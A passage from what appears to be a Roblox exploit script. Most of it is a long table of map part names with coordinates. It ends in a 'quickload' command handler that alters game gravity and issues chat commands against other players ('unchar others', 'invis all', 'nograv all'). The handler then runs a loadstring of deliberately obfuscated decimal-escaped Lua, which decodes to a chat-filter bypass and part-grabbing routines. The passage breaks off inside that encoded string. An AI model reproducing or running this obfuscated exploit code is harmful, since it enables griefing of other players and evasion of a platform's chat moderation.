Part49/-85.576004, 1.25, 15.4740009, 0, 0, 1, 0, -1, 0, 1, 0, 0
Part40/-83.076004, 1.25, 13.9740009, -1, 0, 0, 0, 1, 0, 0, 0, -1
Part39/-86.0770035, 1.20200002, 8.47400093, 0, 0, -1, 0, 1, 0, 1, 0, 0
Part45/-84.076004, 1.37, 14.9740009, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part38/-82.076004, 1.37, 14.9740009, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part43/-80.076004, 1.37, 14.9740009, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part37/-78.076004, 1.37, 14.9740009, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part44/-76.076004, 1.37, 14.9740009, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part33/-77.0770035, 1.20200002, 8.47400093, 0, 0, -1, 0, 1, 0, 1, 0, 0
Part34/-80.0770035, 1.20200002, 8.47400093, 0, 0, -1, 0, 1, 0, 1, 0, 0
Part32/-83.0770035, 1.20200002, 8.47400093, 0, 0, -1, 0, 1, 0, 1, 0, 0
Part30/-85.0780029, 0.936, 7.47600031, 1, 0, 0, 0, -1, 0, 0, 0, -1
Part35/-88.0780029, 0.936, 7.47600031, 1, 0, 0, 0, -1, 0, 0, 0, -1
Baseplate/-501, 0.101, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part23/-75.6300049, 8.5, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part24/-75.6300049, 7.30000019, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part26/-75.6300049, 6.10000038, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part28/-75.6300049, 4.9000001, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part25/-75.6300049, 3.70000029, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part27/-75.6300049, 2.5, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part22/-75.6300049, 1.37, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part21/-70.0300064, 8.5, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part15/-70.0300064, 7.30000019, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part17/-70.0300064, 6.10000038, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part20/-70.0300064, 4.9000001, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part18/-70.0300064, 3.70000029, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part19/-70.0300064, 2.5, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part16/-70.0300064, 1.37, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part13/-69, 8.5, 8.95000076, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part12/-69, 7.30000019, 8.95000076, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part9/-69, 6.10000038, 8.95000076, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part8/-69, 4.9000001, 8.95000076, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part11/-69, 3.70000029, 8.95000076, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part14/-69, 2.5, 8.95000076, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part10/-69, 1.37, 8.95000076, 1, 0, 0, 0, 1, 0, 0, 0, 1
SmoothBlockModel11/-57.0650024, 5.23000002, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1
SmoothBlockModel48/-57.0650024, 11.2300005, 58.2430038, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel15/-57.0650024, 11.2300005, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1
SmoothBlockModel66/-57.5650024, 7.03000021, 66.2430038, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel24/-57.0650024, 10.0300007, 56.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel35/-57.0650024, 13.6300011, 57.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel60/-57.0650024, 15.4300003, 64.2430038, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel64/-57.0650024, 13.6300011, 65.2430038, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel82/-57.0650024, 10.0300007, 66.2430038, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel39/-57.0650024, 13.6300011, 56.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel49/-57.0650024, 15.4300003, 56.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel41/-30.0650005, 21.4300003, 43.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel30/-53.0650024, 22.6300011, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1
SmoothBlockModel37/-30.0650005, 23.8300018, 47.2430038, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel103/-49.0650024, 25.0300007, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1
SmoothBlockModel98/-30.0650005, 26.2300014, 43.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel51/-45.0650024, 27.4300022, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1
SmoothBlockModel75/-30.0650005, 28.6300011, 43.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel56/-41.0649948, 29.8300018, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1
SmoothBlockModel68/-30.0650005, 31.0300007, 43.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel26/-30.0650005, 32.2300034, 47.2430038, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel36/-30.0650005, 33.4300003, 47.2430038, 0, 0, 1, 0, 1, 0, -1, 0, 0
Ceiling Wall/-59.0649872, 31.6999989, 1.24301004, 1, 0, 0, 0, 1, 0, 0, 0, 1
SmoothBlockModel21/-47.0650024, 27.4300022, 41.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel34/-45.0650024, 28.6300011, 41.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel42/-41.0650024, 31.0300007, 41.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel78/-41.0650024, 31.0300007, 53.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel139/-41.0650024, 31.0300007, 65.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel152/-41.0650024, 31.0300007, 77.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel220/-41.0650024, 31.0300007, 89.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel227/-43.0650024, 29.8300018, 95.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel193/-43.0650024, 29.8300018, 83.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel231/-43.0650024, 29.8300018, 71.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel58/-43.0650024, 29.8300018, 59.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel25/-43.0650024, 29.8300018, 47.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel32/-43.0650024, 29.8300018, 41.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel23/-45.0650024, 28.6300011, 53.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel90/-45.0650024, 28.6300011, 65.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel172/-45.0650024, 28.6300011, 77.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel189/-45.0650024, 28.6300011, 89.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel215/-47.0650024, 27.4300022, 95.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel167/-47.0650024, 27.4300022, 83.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel133/-47.0650024, 27.4300022, 71.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel59/-47.0650024, 27.4300022, 59.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel16/-47.0650024, 27.4300022, 47.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel17/-49.0650024, 26.2300014, 41.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel28/-49.0650024, 26.2300014, 53.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel91/-49.0650024, 26.2300014, 65.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel163/-49.0650024, 26.2300014, 77.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel230/-49.0650024, 26.2300014, 89.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel225/-51.0650024, 25.0300007, 95.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel200/-51.0650024, 25.0300007, 83.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel136/-51.0650024, 25.0300007, 71.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel44/-51.0650024, 25.0300007, 59.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel18/-51.0650024, 25.0300007, 47.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel19/-51.0650024, 25.0300007, 41.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel12/-53.0650024, 23.8300018, 41.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel47/-53.0650024, 23.8300018, 53.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel92/-53.0650024, 23.8300018, 65.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel169/-53.0650024, 23.8300018, 77.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel229/-53.0650024, 23.8300018, 89.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel222/-55.0650024, 22.6300011, 95.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel184/-55.0650024, 22.6300011, 83.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel138/-55.0650024, 22.6300011, 71.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel55/-55.0650024, 22.6300011, 59.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel33/-55.0650024, 22.6300011, 47.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel2/-55.0650024, 22.6300011, 41.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel6/-57.0650024, 21.4300003, 41.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel80/-57.0650024, 21.4300003, 53.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel107/-57.0650024, 21.4300003, 65.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel151/-57.0650024, 21.4300003, 77.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel219/-57.0650024, 21.4300003, 89.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel186/-57.0650024, 11.2300005, 86.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel126/-57.0650024, 5.23000002, 43.2429962, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel173/-57.0650024, 13.6300011, 88.2430038, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel179/-57.0650024, 15.4300003, 88.2430038, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel147/-57.0650024, 18.4300003, 101.243042, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel171/-57.0650024, 15.4300003, 86.2430038, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel150/-57.5650024, 7.03000021, 88.2430038, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel145/-57.0650024, 10.0300007, 78.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel146/-57.0650024, 13.6300011, 79.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel106/-57.0650024, 15.4300003, 62.2430077, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel105/-57.0650024, 13.6300011, 63.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel93/-57.0650024, 9.43000031, 80.2430038, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel158/-30.0650005, 38.2300034, 91.2430038, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel94/-30.0650005, 38.2300034, 79.2430038, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel120/-30.0650005, 38.2300034, 67.2430038, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel124/-30.0650005, 38.2300034, 55.2430038, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel135/-11.0650005, 36.4300003, 55.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel118/-11.0650005, 36.4300003, 49.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel130/-13.0650005, 37.0300026, 49.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel176/-15.0650005, 37.6300011, 49.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel129/-17.0650005, 38.2300034, 59.2430038, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel162/-17.0650005, 45.4300003, 59.2430038, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel160/-11.0650005, 45.4300003, 51.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1
SmoothBlockModel165/-11.0650005, 45.4300003, 57.2430038, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel178/-17.0650005, 45.4300003, 57.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1
Chimney/-17.0650005, 45.5200195, 54.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1
SmoothBlockModel143/-30.0650005, 37.0300026, 49.2430038, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel119/-30.0650005, 37.0300026, 61.2430038, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel109/-30.0650005, 37.0300026, 73.2430038, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel149/-30.0650005, 37.0300026, 85.2430038, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel153/-30.0650005, 37.0300026, 97.2430038, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel110/-25.0650005, 34.6300011, 103.243019, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel127/-23.0650005, 33.4300003, 103.243011, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel128/-21.0650005, 32.2300034, 103.243011, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel137/-19.0650005, 31.0300007, 103.243004, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel125/-17.0650005, 29.8300018, 103.243004, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel87/-15.0650005, 28.6300011, 103.243004, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel88/-13.0650005, 27.4300022, 103.243019, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel86/-11.0650005, 26.2300014, 103.243011, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel123/-9.06500053, 25.0300007, 103.243011, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel104/-7.06500053, 23.8300018, 103.242996, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel100/-5.06500006, 22.6300011, 103.243004, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel102/-3.06500006, 21.4300003, 103.243004, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel155/-1.06498528, 5.23000002, 99.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1
SmoothBlockModel121/-2.56500006, 7.03000021, 78.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel161/-3.06500006, 10.0300007, 88.2430038, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel159/-3.06500006, 13.6300011, 87.2430038, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel101/-3.06500006, 15.4300003, 80.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel144/-3.06500006, 13.6300011, 79.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel148/-3.06500006, 10.0300007, 78.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel132/-3.06500006, 15.4300003, 88.2430038, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel142/-3.06500006, 13.6300011, 88.2430038, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel108/-3.06500006, 15.4300003, 82.4430084, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel116/-3.06500006, 13.6300011, 81.2430038, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel85/-3.06500006, 9.43000031, 64.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel113/-3.06500006, 11.2300005, 45.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel69/-3.06500006, 13.6300011, 56.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel115/-3.06500006, 15.4300003, 56.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel81/-3.06500006, 5.23000002, 43.2429962, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel38/-1.06500053, 2.83000016, 72.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1
SmoothBlockModel70/-1.06500244, 11.2300005, 45.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1
SmoothBlockModel20/-38.0649986, 5.23000002, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1
SmoothBlockModel31/-30.0650005, 18.4300003, 43.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel45/-14.0650005, 10.0300007, 45.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1
SmoothBlockModel73/-15.0650005, 13.6300011, 45.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1
SmoothBlockModel83/-22.0650005, 15.4300003, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1
SmoothBlockModel29/-20.0650005, 15.4300003, 45.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1
SmoothBlockModel22/-21.0650043, 13.6300011, 45.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1
SmoothBlockModel67/-14.0650005, 15.4300003, 45.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1
SmoothBlockModel72/-14.0650005, 13.6300011, 45.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1
SmoothBlockModel14/-22.0650005, 9.43000031, 45.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1
SmoothBlockModel7/-45.0650024, 13.6300011, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1
SmoothBlockModel10/-46.0650024, 8.2300005, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1
SmoothBlockModel4/-36.0650024, 8.2300005, 45.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1
SmoothBlockModel46/-37.0650024, 13.6300011, 45.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1
SmoothBlockModel27/-44.0650024, 15.4300003, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1
SmoothBlockModel3/-37.0650024, 4.63000011, 44.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1
SmoothBlockModel9/-37.0650024, 2.83000016, 42.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1
SmoothBlockModel5/-37.0650024, 1.63000011, 39.243, -1, 0, 0, 0, 1, 0, 0, 0, -1
SmoothBlockModel1/-37.0650024, 1.03000009, 37.243, -1, 0, 0, 0, 1, 0, 0, 0, -1
SmoothBlockModel97/-43.0650024, 19.6300011, 72.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1
SmoothBlockModel52/-21.0650005, 19.6300011, 72.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1
Divider10/-46.7649994, 6.42999983, 96.8430023, 0, 0, 1, 0, 1, 0, -1, 0, 0
Back/-48.2649994, 6.42999983, 96.3430023, 1, 0, 0, 0, 1, 0, 0, 0, 1
Divider9/-42.7650032, 6.42999983, 96.8430023, 0, 0, 1, 0, 1, 0, -1, 0, 0
Divider8/-38.7649918, 6.42999983, 96.8430023, 0, 0, 1, 0, 1, 0, -1, 0, 0
Divider7/-34.7649841, 6.42999983, 96.8430023, 0, 0, 1, 0, 1, 0, -1, 0, 0
Divider6/-30.7649822, 6.42999983, 96.8430023, 0, 0, 1, 0, 1, 0, -1, 0, 0
Divider5/-26.7649746, 6.42999983, 96.8430023, 0, 0, 1, 0, 1, 0, -1, 0, 0
Divider4/-22.7649727, 6.42999983, 96.8430023, 0, 0, 1, 0, 1, 0, -1, 0, 0
Divider3/-18.7649689, 6.42999983, 96.8430023, 0, 0, 1, 0, 1, 0, -1, 0, 0
Divider2/-14.7649689, 6.42999983, 96.8430023, 0, 0, 1, 0, 1, 0, -1, 0, 0
Divider1/-10.7649708, 6.42999983, 96.8430023, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel232/-31.6660023, 5.82995605, 70.4320068, 1, 0, 0, 0, 1, 0, 0, 0, 1
Spawn1/-25, 0.0999880284, -25.5900097, -1, 0, 0, 0, 1, 0, 0, 0, -1
Spawn3/-37, 0.0999999493, -25.5899963, -1, 0, 0, 0, 1, 0, 0, 0, -1
Spawn2/-49, 0.0999999493, -25.5900097, -1, 0, 0, 0, 1, 0, 0, 0, -1
SmoothBlockModel164/-16.0649986, 11.2300005, 99.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1
SmoothBlockModel134/-3.06500006, 11.2300005, 101.243004, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel122/-3.06500006, 18.4300003, 101.243011, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel191/-30.0650005, 18.4300003, 101.243004, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel201/-30.1650009, 21.4300003, 97.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel197/-30.0650005, 22.6300011, 97.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel203/-30.0650005, 23.8300018, 101.243004, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel209/-30.0650005, 25.0300007, 101.243004, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel208/-30.0650005, 26.2300014, 97.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel210/-30.0650005, 27.4300022, 101.243004, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel207/-30.0650005, 28.6300011, 97.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel211/-30.0650005, 29.8300018, 101.243004, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel213/-30.0650005, 31.0300007, 97.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel226/-30.0650005, 32.2300034, 97.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel223/-33.0650024, 34.6300011, 99.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1
SmoothBlockModel190/-30.0650005, 33.4300003, 101.243004, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel95/-27.0650005, 35.8300018, 103.243011, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel202/-30.0650005, 38.2300034, 103.243004, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel188/-30.0650005, 37.0300026, 103.243004, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel187/-33.0650024, 35.8300018, 89.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel214/-35.0650024, 34.6300011, 95.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel221/-37.0650024, 33.4300003, 89.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel216/-39.0650024, 32.2300034, 95.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
Jump5/-41.0650024, 1.37, 4.24300098, 0, 0, -1, 0, 1, 0, 1, 0, 0
    ]])
			end
			if msg:lower() == prefix .. "quickload" then
				game.Workspace.Gravity = 0
				local ClientSound = Instance.new("Sound")
				ClientSound.SoundId = "http://www.roblox.com/asset/?id=5807626717"
				ClientSound.Volume = 1.5
				ClientSound.Parent = workspace
				ClientSound.PlaybackSpeed = 1
				ClientSound:Play()
				logn("It's recommended to have Anti Punish Enabled so people are less likely to sabotage you")
				chatt("/toggle antivoid")
				chatt("unchar others")
				chatt("invis all")
				chatt("nograv all")
				chatt(prefix.."voidbypass");task.wait()
				--// Quickload \\-- Bytecode of course because this piece of shit isn't obfuscating otherwise
				loadstring("\45\45\47\47\32\67\104\97\116\98\121\112\97\115\115\32\92\92\45\45\10\108\111\99\97\108\32\67\104\97\116\66\97\114\32\61\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\80\108\97\121\101\114\71\117\105\46\67\104\97\116\46\70\114\97\109\101\46\67\104\97\116\66\97\114\80\97\114\101\110\116\70\114\97\109\101\46\70\114\97\109\101\46\66\111\120\70\114\97\109\101\46\70\114\97\109\101\46\67\104\97\116\66\97\114\10\108\111\99\97\108\32\102\117\110\99\116\105\111\110\32\99\104\116\40\109\97\115\115\97\103\101\41\10\32\32\32\32\67\104\97\116\66\97\114\58\83\101\116\84\101\120\116\70\114\111\109\73\110\112\117\116\40\109\97\115\115\97\103\101\41\10\32\32\32\32\103\97\109\101\46\80\108\97\121\101\114\115\58\67\104\97\116\40\109\97\115\115\97\103\101\41\10\32\32\32\32\67\104\97\116\66\97\114\46\84\101\120\116\32\61\32\34\34\10\101\110\100\10\45\45\47\47\32\81\117\105\99\107\108\111\97\100\32\92\92\45\45\10\108\111\99\97\108\32\102\117\110\99\116\105\111\110\32\116\97\107\101\112\97\114\116\116\111\40\112\97\114\116\116\44\32\99\102\114\97\109\41\10\9\108\111\99\97\108\32\102\117\110\99\116\105\111\110\32\114\97\110\100\111\109\115\105\109\40\41\10\9\9\108\111\99\97\108\32\116\97\98\108\101\115\105\109\32\61\32\123\34\124\34\44\32\34\60\34\44\32\34\46\34\44\32\34\62\34\44\32\34\47\34\44\32\34\63\34\44\32\34\59\34\44\32\34\58\34\44\32\34\64\34\44\32\34\39\34\44\32\34\126\34\44\32\34\35\34\44\32\34\93\34\44\32\34\125\34\44\32\34\91\34\44\32\34\123\34\44\32\34\61\34\44\32\34\43\34\44\32\34\45\34\44\32\34\95\34\44\32\34\41\34\44\32\34\40\34\44\32\34\42\34\44\32\34\38\34\44\32\34\94\34\44\32\34\37\34\44\32\34\36\34\44\32\34\33\34\125\10\9\9\114\101\116\117\114\110\32\116\97\98\108\101\115\105\109\91\109\97\116\104\46\114\97\110\100\111\109\40\49\44\32\35\116\97\98\108\101\115\105\109\41\93\46\46\116\97\98\108\101\115\105\109\91\109\97\116\104\46\114\97\110\100\111\109\40\49\44\32\35\116\97\98\108\101\115\105\109\41\93\46\46\116\97\98\108\101\115\105\109\91\109\97\116\104\46\114\97\110\100\111\109\40\49\44\32\35\116\97\98\108\101\115\105\109\41\93\46\46\116\97\98\108\101\115\105\109\91\109\97\116\104\46\114\97\110\100\111\109\40\49\44\32\35\116\97\98\108\101\115\105\109\41\93\46\46\116\97\98\108\101\115\105\109\91\109\97\116\104\46\114\97\110\100\111\109\40\49\44\32\35\116\97\98\108\101\115\105\109\41\93\46\46\116\97\98\108\101\115\105\109\91\109\97\116\104\46\114\97\110\100\111\109\40\49\44\32\35\116\97\98\108\101\115\105\109\41\93\46\46\116\97\98\108\101\115\105\109\91\109\97\116\104\46\114\97\110\100\111\109\40\49\44\32\35\116\97\98\108\101\115\105\109\41\93\10\9\101\110\100\10\9\108\111\99\97\108\32\102\117\110\99\116\105\111\110\32\119\97\105\116\102\111\114\105\118\111\114\121\40\41\10\9\9\114\101\112\101\97\116\10\9\9\9\105\102\32\110\111\116\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\87\111\114\107\115\112\97\99\